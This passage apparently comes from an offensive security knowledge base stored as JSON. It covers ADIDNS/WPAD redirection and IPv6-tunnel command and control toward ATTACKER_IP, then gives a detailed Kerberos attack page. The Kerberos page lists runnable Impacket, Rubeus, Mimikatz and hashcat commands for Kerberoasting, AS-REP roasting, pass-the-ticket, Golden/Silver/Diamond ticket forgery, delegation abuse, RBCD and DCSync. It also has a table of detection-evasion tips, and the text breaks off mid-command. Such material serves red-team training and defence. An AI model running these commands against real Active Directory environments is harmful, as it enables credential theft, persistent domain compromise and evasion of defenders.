MTU discovery)\n```\n\n### ADIDNS Abuse for Persistent Redirect\n\nAdd DNS records as any domain user to persistently redirect traffic:\n\n```bash\n# Prerequisite: domain user credentials (any standard user)\n# Add WPAD record pointing to attacker (persists in AD until deleted)\npython3 dnstool.py -u 'corp.local\\user' -p 'Password123' \\\n -r wpad \\\n -d ATTACKER_IP \\\n --action add \\\n DC_IP\n\n# Verify addition:\nnslookup wpad.corp.local DC_IP\n# All Windows hosts querying WPAD will now authenticate to ATTACKER_IP\n\n# AAAA record for IPv6-specific redirect:\npython3 dnstool.py -u 'corp.local\\user' -p 'Password123' \\\n -r wpad \\\n -d 'fe80::attacker' \\\n --action add --record-type AAAA \\\n DC_IP\n\n# Cleanup: remove record after capture to avoid persistent network disruption\npython3 dnstool.py -u 'corp.local\\user' -p 'Password123' \\\n -r wpad --action remove DC_IP\n```\n\n### IPv6 Tunnel Persistence\n\nUse IPv6 tunneling protocols for C2 that bypasses IPv4 egress filtering:\n\n```bash\n# 6in4 tunnel: encapsulates IPv6 in IPv4 (protocol 41)\n# Many firewalls pass protocol 41 without inspection\n# Server side: configure 6in4 endpoint\nip tunnel add tun0 mode sit remote ATTACKER_IP local TARGET_OUTBOUND_IP\nip link set tun0 up\nip addr add 2001:db8::2/64 dev tun0\n\n# Teredo: IPv6-in-UDP-in-IPv4 (UDP 3544)\n# Traverses NAT; many orgs pass UDP 3544\napt install miredo\n# Traffic: UDP 3544 → Teredo relay → IPv6 destination (C2 server)\n\n# DNS64/NAT64: IPv4-only client → IPv6-only C2 server\n# Requires DNS64 in path but effective when IPv6 outbound allowed\n# Harder for defenders to block without breaking legitimate IPv6\n\n# Detection by defender:\n# - Flow-level monitoring for protocol 41 or UDP 3544 to external IPs\n# - These should almost never appear in corporate traffic\n```", "last_updated": "2026-03-18"}, "kerberos-attacks": {"slug": "kerberos-attacks", "title": "Kerberos Attacks", "category": "Network Attacks", "content": "# Kerberos Attacks\n\n## ◈ BEGINNER\n\n### What Is Kerberos and Why Attack It?\n\n**Kerberos** is the primary authentication protocol in Active Directory environments. Instead of sending passwords over the network, it uses encrypted tickets issued by a Key Distribution Center (KDC — the domain controller). Despite being more secure than NTLM, Kerberos has several attack surfaces that are heavily exploited in red team operations.\n\n**Key terms:**\n- **KDC (Key Distribution Center)** — the domain controller's authentication service; issues TGTs and service tickets\n- **TGT (Ticket Granting Ticket)** — a ticket issued after initial login that proves identity; used to request service tickets without re-entering credentials; encrypted with the krbtgt hash\n- **krbtgt** — the domain's Kerberos service account; its NTLM hash is used to sign all TGTs; stealing it enables Golden Ticket attacks\n- **Service Ticket (TGS)** — a ticket granting access to a specific service (e.g., SMB on FILESERVER); encrypted with the service account's NTLM hash\n- **SPN (Service Principal Name)** — a unique identifier for a service instance; tied to a service account; requesting a service ticket for an SPN is the basis of Kerberoasting\n- **Kerberoasting** — requesting service tickets for SPN-registered accounts and cracking the tickets offline to recover service account passwords\n- **AS-REP Roasting** — attacking accounts with pre-authentication disabled; these accounts send an encrypted response without requiring the requester to prove their identity first\n- **Pass-the-Ticket (PtT)** — extracting and reusing Kerberos tickets from memory without knowing the underlying password\n- **Golden Ticket** — a forged TGT created using the krbtgt hash; grants unrestricted domain access; valid for 10 years by default\n- **Silver Ticket** — a forged service ticket for a specific service; bypasses the KDC entirely (no logs on the DC)\n- **Diamond Ticket** — a Golden Ticket improvement that modifies a legitimate TGT rather than forging from scratch; harder to detect\n- **RBCD (Resource-Based Constrained Delegation)** — a delegation type that, if misconfigured, allows arbitrary privilege escalation via S4U2Self/S4U2Proxy\n\n**Why Kerberoasting is so common:**\n- Any domain user can request service tickets for any SPN-registered account\n- No special privileges required to collect the tickets\n- Cracking happens entirely offline — no network noise after collection\n- Service accounts often have weak passwords and rarely change them\n\n**Analogy:** Kerberos works like airport security with a master pass (TGT) and boarding passes (service tickets). Golden Ticket is like forging the master pass with the TSA's own stamp. Kerberoasting is like taking a boarding pass home and trying every possible passenger name until the signature matches.\n\n## ◈ INTERMEDIATE\n\nKerberos is the primary authentication protocol in Active Directory. Its ticket-based architecture introduces a rich attack surface — from offline hash cracking to forged tickets granting unlimited domain access.\n\n### Kerberos Protocol Overview\n\n```\n1. AS-REQ → KDC: \"I am user@corp.local, give me a TGT\"\n2. AS-REP ← KDC: TGT (encrypted with krbtgt hash) + session key (encrypted with user hash)\n3. TGS-REQ → KDC: TGT + \"I need access to SPN host/server01\"\n4. TGS-REP ← KDC: Service Ticket (encrypted with service account hash)\n5. AP-REQ → Service: Service Ticket\n6. AP-REP ← Service: Access granted\n```\n\nKey insight: Service tickets encrypted with the **service account's NTLM hash** — crackable offline.\n\n---\n\n### AS-REP Roasting\n\nAccounts with \"Do not require Kerberos preauthentication\" send AS-REP encrypted only with the user's password hash — no authentication needed to request:\n\n```bash\n# Find vulnerable accounts (no preauth)\nimpacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10\nimpacket-GetNPUsers corp.local/ -dc-ip 192.168.1.10 -request # enumerate all\n\n# PowerView\nGet-DomainUser -PreauthNotRequired | Select-Object samaccountname\n\n# Rubeus\n.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n\n# Crack AS-REP hash (-m 18200)\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 18200 asrep.txt -a 3 \"?a?a?a?a?a?a?a?a\"\n```\n\n---\n\n### Kerberoasting\n\nRequest service tickets for any SPN-registered account — ticket encrypted with service account's NTLM hash:\n\n```bash\n# Impacket (from Linux)\nimpacket-GetUserSPNs corp.local/user:password -dc-ip 192.168.1.10 -request\nimpacket-GetUserSPNs corp.local/user:password -dc-ip 192.168.1.10 \\\n -outputfile kerberoast.txt\n\n# Rubeus (from Windows)\n.\\Rubeus.exe kerberoast /outfile:tgs.txt\n.\\Rubeus.exe kerberoast /user:svcSQL /outfile:tgs.txt # targeted\n\n# PowerView + Invoke-Kerberoast\nInvoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash\n\n# Crack TGS hash (-m 13100)\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 13100 kerberoast.txt -r /usr/share/hashcat/rules/best64.rule rockyou.txt\n\n# RC4 vs AES: if SPN account supports RC4 (etype 17/18), request RC4:\n.\\Rubeus.exe kerberoast /tgtdeleg /rc4opsec # downgrade to RC4 where possible\n```\n\n---\n\n### Pass-the-Ticket (PtT)\n\nUse captured Kerberos tickets without the original password:\n\n```bash\n# Dump tickets from memory (Windows — requires local admin)\n.\\Mimikatz.exe \"sekurlsa::tickets /export\" exit\n# Creates .kirbi files\n\n# Rubeus: dump all tickets\n.\\Rubeus.exe dump /service:krbtgt /nowrap\n\n# Inject ticket\n.\\Rubeus.exe ptt /ticket:ticket.kirbi\n# Or: .\\Mimikatz.exe \"kerberos::ptt ticket.kirbi\" exit\n\n# From Linux: convert .kirbi to ccache\npython3 ticketConverter.py ticket.kirbi ticket.ccache\nexport KRB5CCNAME=ticket.ccache\nimpacket-psexec -k -no-pass corp.local/user@target.corp.local\n\n# List current tickets\nklist # Linux\n.\\Rubeus.exe klist # Windows\n```\n\n---\n\n### Golden Ticket\n\nForge TGTs using the krbtgt account hash — bypasses all KDC validation:\n\n```bash\n# Prerequisites: krbtgt NTLM hash (from DCSync or LSASS dump)\n# Get krbtgt hash via DCSync:\nimpacket-secretsdump corp.local/Administrator:pass@dc01.corp.local -just-dc-user krbtgt\n# Or Mimikatz: lsadump::dcsync /user:krbtgt\n\n# Forge Golden Ticket (Mimikatz)\nmimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local \\\n /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\\n /krbtgt:KRBTGT_NTLM_HASH \\\n /groups:512 \\\n /ticket:golden.kirbi\n# /groups:512 = Domain Admins\n\n# Forge with Impacket (Linux)\nimpacket-ticketer -nthash KRBTGT_HASH \\\n -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\\n -domain corp.local \\\n -groups 512,519 \\\n FakeAdmin\n\nexport KRB5CCNAME=FakeAdmin.ccache\nimpacket-psexec -k -no-pass FakeAdmin@dc01.corp.local\n\n# Golden Ticket properties:\n# - Valid for 10 years (default)\n# - Works even after password change\n# - Survives domain controller reboots\n# - Only reset by changing krbtgt password TWICE\n```\n\n---\n\n### Silver Ticket\n\nForge service tickets using a service account's hash — bypasses KDC entirely (no logging on DC):\n\n```bash\n# Forge Silver Ticket for CIFS (SMB) on server01\nimpacket-ticketer -nthash SERVICE_ACCOUNT_HASH \\\n -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\\n -domain corp.local \\\n -spn cifs/server01.corp.local \\\n Administrator\n\nexport KRB5CCNAME=Administrator.ccache\nimpacket-smbclient -k -no-pass corp.local/Administrator@server01.corp.local\n\n# Mimikatz Silver Ticket\nmimikatz # kerberos::golden /user:Administrator /domain:corp.local \\\n /sid:DOMAIN_SID /target:server01.corp.local \\\n /service:cifs /rc4:SERVICE_HASH \\\n /ticket:silver.kirbi\n\n# Common SPN targets:\n# cifs/server → SMB file access\n# http/server → IIS/web access\n# host/server → WMI, PSRemoting, scheduled tasks\n# ldap/dc → LDAP queries\n# mssql/server → SQL Server access\n```\n\n---\n\n### Diamond Ticket\n\nGolden Ticket improvement — modifies a legitimate TGT rather than forging from scratch (harder to detect):\n\n```bash\n# Rubeus Diamond Ticket\n.\\Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:lowpriv /password:pass \\\n /enctype:aes /domain:corp.local /dc:dc01.corp.local \\\n /ticketuser:Administrator /ticketuserrid:500 /groups:512 /nowrap\n\n# Diamond tickets pass PAC validation (real PAC, modified fields)\n# Evades Golden Ticket detections based on anomalous PAC structure\n```\n\n---\n\n### Constrained Delegation Abuse\n\nIf a service account has \"Trust this computer for delegation to specified services\" (constrained delegation), it can impersonate any user to those services:\n\n```bash\n# Find accounts with constrained delegation\nimpacket-findDelegation corp.local/user:pass -dc-ip 192.168.1.10\n# Or PowerView: Get-DomainUser -TrustedToAuth\n\n# S4U2Self + S4U2Proxy: impersonate domain admin to delegated service\n.\\Rubeus.exe s4u /user:svcIIS /rc4:SERVICE_HASH /impersonateuser:Administrator \\\n /msdsspn:\"cifs/fileserver.corp.local\" /ptt\n\n# From Linux:\nimpacket-getST -spn cifs/fileserver.corp.local \\\n -impersonate Administrator \\\n corp.local/svcIIS:ServicePassword \\\n -dc-ip 192.168.1.10\nexport KRB5CCNAME=Administrator@cifs_fileserver.corp.local.ccache\nimpacket-smbclient -k -no-pass Administrator@fileserver.corp.local\n```\n\n---\n\n### Unconstrained Delegation\n\nServers with unconstrained delegation receive user's full TGT — extract and reuse:\n\n```bash\n# Find unconstrained delegation computers\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} | Select Name\n\n# On unconstrained delegation host — wait for DC to authenticate:\n# Coerce DC authentication with PetitPotam/PrinterBug to unconstrained host\n\n# Rubeus monitor for incoming TGTs\n.\\Rubeus.exe monitor /interval:5 /nowrap\n\n# When DC TGT arrives → inject it\n.\\Rubeus.exe ptt /ticket:BASE64_TGT\n# Now have DC machine account TGT → DCSync\n.\\Mimikatz.exe \"lsadump::dcsync /domain:corp.local /all\" exit\n```\n\n---\n\n### Resource-Based Constrained Delegation (RBCD)\n\nWrite msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object to allow another computer to impersonate users to it:\n\n```bash\n# Prerequisites: write access to target computer object (GenericWrite/GenericAll)\n# Step 1: Create/use attacker-controlled machine account\nimpacket-addcomputer corp.local/user:pass -computer-name \"ATTACKER$\" \\\n -computer-pass \"AttackerPass123\"\n\n# Step 2: Set RBCD attribute on target\npython3 rbcd.py -delegate-from \"ATTACKER$\" -delegate-to \"TARGET$\" \\\n -action write corp.local/user:pass -dc-ip 192.168.1.10\n\n# Step 3: S4U to impersonate Administrator on target\nimpacket-getST -spn cifs/target.corp.local \\\n -impersonate Administrator \\\n -dc-ip 192.168.1.10 \\\n corp.local/\"ATTACKER$\":AttackerPass123\nexport KRB5CCNAME=Administrator@cifs_target.corp.local.ccache\nimpacket-psexec -k -no-pass Administrator@target.corp.local\n```\n\n---\n\n### Kerberos Hash Reference\n\n| Hash Type | Hashcat Mode | Example Attack |\n|-----------|-------------|----------------|\n| AS-REP (no preauth) | 18200 | AS-REP Roast |\n| TGS-REP RC4 (Kerberoast) | 13100 | Kerberoast |\n| TGS-REP AES128 | 19600 | Kerberoast (AES) |\n| TGS-REP AES256 | 19700 | Kerberoast (AES) |\n| Kerberos 5 TGT | N/A | Golden/Silver (forge, not crack) |\n\n---\n\n### Detection and Evasion\n\n| Attack | Detection | Evasion |\n|--------|-----------|---------|\n| Kerberoast | Event 4769 (TGS request for RC4) | Request AES tickets; use managed service accounts |\n| AS-REP Roast | Event 4768 (no preauth flag) | Target single account; slow rate |\n| Golden Ticket | Event 4769 with unusual PAC | Diamond ticket; blend with legitimate traffic |\n| DCSync | Event 4662 (DRSUAPI replication) | Use VSS shadow copy instead |\n| Overpass-the-Hash | Event 4768 from unusual host | Use legitimate admin workstation |\n\n## ◈ ADVANCED\n\n### Targeted Kerberoasting — Avoiding Bulk Detection\n\nBulk Kerberoasting (requesting all SPN tickets) triggers Event 4769 spikes. Targeted approaches:\n\n```bash\n# Identify high-value SPN accounts first:\n# Service accounts with admin rights → SQLAdmin, svcIIS running as DA\nGet-DomainUser -SPN | Where-Object {$_.admincount -eq
